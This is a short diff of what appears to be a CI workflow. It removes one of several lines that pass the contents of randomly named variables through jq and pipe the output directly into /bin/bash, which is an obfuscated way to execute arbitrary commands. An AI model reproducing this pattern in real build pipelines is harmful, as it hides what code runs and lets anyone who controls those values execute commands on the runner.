@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ie34" | jq -r .vfo1002 | /bin/bash
           printf '%s' "$zjga279" | jq -r .fswe58671 | /bin/bash
           printf '%s' "$j104" | jq -r .lh9810 | /bin/bash
-          printf '%s' "$wk88243" | jq -r .bp46 | /bin/bash
           echo $nyuwh987 | jq -r .d19170 | /bin/bash
 
       - name: Upload artifact
